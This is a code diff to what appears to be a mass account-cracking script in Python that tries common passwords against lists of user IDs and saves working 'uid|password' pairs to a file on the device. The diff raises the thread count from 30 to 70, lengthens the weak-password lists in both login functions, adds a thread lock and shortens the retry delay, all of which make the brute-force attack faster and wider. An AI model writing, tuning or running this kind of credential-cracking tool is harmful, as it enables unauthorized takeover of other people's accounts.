@@ -12,6 +12,8 @@ import urllib
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
+import threading
+loop_lock = threading.Lock()
 from os import system
 from datetime import datetime
 
@@ -345,7 +347,7 @@ def old_One():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m● METHOD 2 ⚡ PREMIUM')
     linex()
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m◈ CHOICE ✦ {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
+    with tred(max_workers=70) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m◈ TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m✈ USE AIRPLANE MODE FOR BEST RESULT ✈{G}")
@@ -384,7 +386,7 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m● METHOD B ⚡')
     linex()
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ CHOICE ✦ {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
+    with tred(max_workers=70) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m✈ USE AIRPLANE MODE FOR BEST RESULT ✈{G}")
@@ -421,7 +423,7 @@ def old_Tree():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m● METHOD B ⚡')
     linex()
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ CHOICE ✦ {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
+    with tred(max_workers=70) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ TOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m✈ USE AIRPLANE MODE FOR BEST RESULT ✈{G}")
@@ -445,7 +447,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37m◆ RDX-M1 ◆\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789'):
+        for pw in ('123456', '123456789', '12345678', '1234567', '123123', '111111', '123321', '000000', '654321', '112233', '121212', '1234', '12345', 'password', 'qwerty', '1234561', '123123123', '654321'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -497,9 +499,12 @@ def login_1(uid):
                 open('/sdcard/RDX-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
-        loop += 1
+        with loop_lock:
+            loop += 1
     except Exception:
-        time.sleep(5)
+        with loop_lock:
+            loop += 1
+        time.sleep(2)
 
 
 def login_2(uid):
@@ -508,7 +513,7 @@ def login_2(uid):
     """
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37m◆ RDX-M2 ◆\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
 
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+    for pw in ('123456', '123456789', '12345678', '1234567', '123123', '111111', 'password', '123321', '000000', '654321', '112233', '121212', 'qwerty', '1234', '12345', '1234561', '123123123', '654321', '1q2w3e', 'password123'):
         try:
             with requests.Session() as session:
                 headers = {
@@ -535,7 +540,8 @@ def login_2(uid):
                     break
         except Exception as e:
             pass
-    loop += 1
+    with loop_lock:
+        loop += 1
 
 if __name__ == '__main__':
     BNG_71_()
